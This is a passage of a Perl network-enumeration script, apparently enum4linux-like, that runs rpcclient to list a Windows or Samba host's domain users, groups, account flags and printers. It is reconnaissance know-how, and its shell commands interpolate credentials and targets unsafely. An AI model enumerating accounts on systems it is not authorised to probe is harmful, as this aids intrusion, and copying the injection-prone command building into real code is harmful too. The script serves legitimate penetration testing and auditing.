						get_group_details_from_rid($rid) if $sid_and_user =~ /\((Local|Domain) Group\)/;
					}
				} else {
					$fail_count++;
				}
				
				if ($global_search_until_fail) {
					last if $fail_count > $global_fail_limit;
				}
			}
		}
	} # foreach sid
}

sub enum_users {
	print_heading("Users on $global_target");
	my $command = "rpcclient -W '$global_workgroup' -c querydispinfo -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	my $users = `$command`;
	my $continue = 1;
	if ($users =~ /NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($users) = $users =~ /(index:.*)/s;
		print $users;
		$continue = 0;
	}
	my @rids_hex = $users =~ /RID:\s+0x([a-fA-f0-9]+)\s/gs;
	my @rids = map { hex($_) } @rids_hex;

	print "\n";
	$command = "rpcclient -W '$global_workgroup' -c enumdomusers -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	$users = `$command`;
	if ($users =~ /NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($users) = $users =~ /(user:.*)/s;
		print $users;
	}
	my @rids_hex2 = $users =~ /rid:\[0x([A-Fa-f0-9]+)\]/gs;
	my @rids2 = map { hex($_) } @rids_hex2;

	my %rids;
	foreach my $rid (@rids, @rids2) {
		$rids{$rid} = 1;
	}
	foreach my $rid (keys %rids) {
		get_user_details_from_rid($rid);
	}
}

sub get_group_details_from_rid {
	my $rid = shift;
	if (invalid_rid($rid)) {
		print "[E] Invalid rid passed: $rid\n";
		return 0;
	}
	return unless $global_detailed;
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' -c 'querygroup $rid' '$global_target' 2>&1";
	print "[V] Attempting to get detailed group info with command: $command\n" if $verbose;
	my $group_info = `$command`;
	($group_info) = $group_info =~ /([^\n]*Group Name.*Num Members[^\n]*)/s;
	if (defined($group_info)) {
		print "$group_info\n\n";
	} else {
		print "[E] No info found\n\n";
	}
}

sub get_user_details_from_rid {
	my $rid = shift;
	if (invalid_rid($rid)) {
		print "[E] Invalid rid passed: $rid\n";
		return 0;
	}
	return unless $global_detailed;
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' -c 'queryuser $rid' '$global_target' 2>&1";
	print "[V] Attempting to get detailed user info with command: $command\n" if $verbose;
	my $user_info = `$command`;
	($user_info) = $user_info =~ /([^\n]*User Name.*logon_hrs[^\n]*)/s;
	print "$user_info\n" if defined($user_info);
	my ($acb_info) = $user_info =~ /acb_info\s+:\s+0x([0-9a-fA-F]+)/;
	if ($acb_info) {
		my $acb_int = hex($acb_info);
		my $pad = "\t";
		if ($acb_int & 0x00000001) {
			printf $pad . "%-25.25s: %s\n", "Account Disabled", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Account Disabled", "False";
		}
		if ($acb_int & 0x00000200) {
			printf $pad . "%-25.25s: %s\n", "Password does not expire", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Password does not expire", "False";
		}
		if ($acb_int & 0x00000400) {
			printf $pad . "%-25.25s: %s\n", "Account locked out", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Account locked out", "False";
		}
		if ($acb_int & 0x00020000) {
			printf $pad . "%-25.25s: %s\n", "Password expired", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Password expired", "False";
		}
		if ($acb_int & 0x00000040) {
			printf $pad . "%-25.25s: %s\n", "Interdomain trust account", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Interdomain trust account", "False";
		}
		if ($acb_int & 0x00000080) {
			printf $pad . "%-25.25s: %s\n", "Workstation trust account", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Workstation trust account", "False";
		}
		if ($acb_int & 0x00000100) {
			printf $pad . "%-25.25s: %s\n", "Server trust account", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Server trust account", "False";
		}
		if ($acb_int & 0x00002000) {
			printf $pad . "%-25.25s: %s\n", "Trusted for delegation", "True";
		} else {
			printf $pad . "%-25.25s: %s\n", "Trusted for delegation", "False";
		}
	}
	print "\n";
}

sub invalid_rid {
	my $rid = shift;
	if ($rid =~ /^\d+$/) {
		return 0;
	} else {
		return 1;
	}
}

sub get_printer_info {
	print_heading("Getting printer info for $global_target");
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' -c 'enumprinters' '$global_target' 2>&1";
	print "[V] Attempting to get printer info with command: $command\n" if $verbose;
	my $printer_info = `$command`;
	# ($group_info) = $group_info =~ /([^\n]*Group Name.*Num Members[^\n]*)/s;
	if (defined($printer_info)) {
		print "$printer_info\n\n";
	} else {
		print "[E] No info found\n\n";
	}

}

sub nbt_to_human {
	my $nbt_in = shift; # multi-line
	my @nbt_in = split (/\n/, $nbt_in);
	my @nbt_out = ();
	foreach my $line (@nbt_in) {
		if ($line =~ /\s+(\S+)\s+<(..)>\s+-\s+?(<GROUP>)?\s+?[A-Z]/) {
			my $line_val = $1;
			my $line_code = uc $2;
			my $line_group = defined($3) ? 0 : 1; # opposite

			foreach my $info_aref (@nbt_info) {
				my ($pattern, $code, $group, $desc) = @$info_aref;
				# print "Matching: line=\"$line\", val=$line_val, code=$line_code, group=$line_group against pattern=$pattern, code=$code, group=$group, desc=$desc\n";
				if ($pattern) {
					if ($line_val =~ /$pattern/ and $line_code eq $code and $line_group eq $group) {
						push @nbt_out, "$line $desc";
						last;
					}
				} else {
					if ($line_code eq $code and $line_group eq $group) {
						push @nbt_out, "$line $desc";
						last;
					}
				}	
			}
		} else {
			push @nbt_out, $line;
		}
	}	
	return join "\n", @nbt_out;
}

sub print_heading {
	my $string = shift;
	my $output = "|    $string    |";
	my $len = length($output);
	print "\n";
	print " " . "=" x ($len - 2) . " \n";
	print "$output\n";
	print " " . "=" x ($len - 2) . " \n";
}
